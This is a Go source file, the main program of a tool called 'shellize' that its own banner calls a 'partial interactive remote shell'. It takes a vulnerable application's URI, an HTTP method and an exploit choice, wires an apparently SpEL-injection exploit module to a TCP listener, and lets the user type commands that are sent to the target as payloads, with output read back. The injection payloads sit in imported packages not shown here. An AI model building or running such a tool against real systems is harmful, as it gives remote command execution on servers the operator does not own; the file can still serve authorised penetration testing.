package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/c-bata/go-prompt"
	"ottimo.me/shellize/exploit"
	"ottimo.me/shellize/listener"
	"ottimo.me/shellize/suggester"
)

type CmdLine struct {
	Host    string
	Port    int
	Uri     string
	Method  string
	Exploit string
}

var c CmdLine
var cmd_queue chan string

func parseCmd() {
	flag.StringVar(&c.Host, "l", "localhost", "Address to listen stdout from command")
	flag.IntVar(&c.Port, "p", 8080, "Port to listen stdout from command")
	flag.StringVar(&c.Uri, "u", "http://localhost:8080", "URI for the vulnerable application")
	flag.StringVar(&c.Method, "m", "GET", "HTTP method to use")
	flag.StringVar(&c.Exploit, "e", "", "Exploit to use")

	flag.Parse()
}

func completer(d prompt.Document) []prompt.Suggest {
	return prompt.FilterHasPrefix(suggester.Suggester, d.GetWordBeforeCursor(), true)
}

func process(ch *chan string, payload *chan string) {
	var cmd string
	for {
		cmd = <-*ch
		if cmd == "quit" {
			fmt.Println("Exiting... Bye!")
			os.Exit(0)
		} else if cmd == "" {

		} else {
			fmt.Println("'" + cmd + "' command sending...")
			*payload <- cmd
		}
	}
}
func callback(ch *chan string) {
	var ret string
	for {
		ret = <-*ch
		fmt.Println(ret)
		//prompt.ConsoleWriter.WriteStr(ret)
	}
}
func cmdFunction(t string) {
	cmd_queue <- t
}

func main() {
	parseCmd()
	var expl = exploit.Spel{} // how to parametrize?
	var listen = listener.Tcp{}

	var e = new(exploit.Endpoint)
	e.Uri = c.Uri
	e.Method = c.Method
	e.Host = c.Host
	e.Port = c.Port

	var l = new(listener.Endpoint)
	l.Address = c.Host
	l.Port = c.Port

	cmd_queue = make(chan string)
	var payload_queue = make(chan string)
	var return_queue = make(chan string)

	suggester.Create()
	expl.Create(*e, &payload_queue)
	listen.Create(*l, &return_queue)
	go process(&cmd_queue, &payload_queue)
	go callback(&return_queue)

	var c = new(suggester.Completer)

	p := prompt.New(
		cmdFunction,
		c.Complete,
		prompt.OptionTitle("shellize: partial interactive remote shell"),
		prompt.OptionPrefix(">>> "),
		prompt.OptionInputTextColor(prompt.Yellow),
	)
	fmt.Println("shellize: partial interactive remote shell")
	p.Run()

}
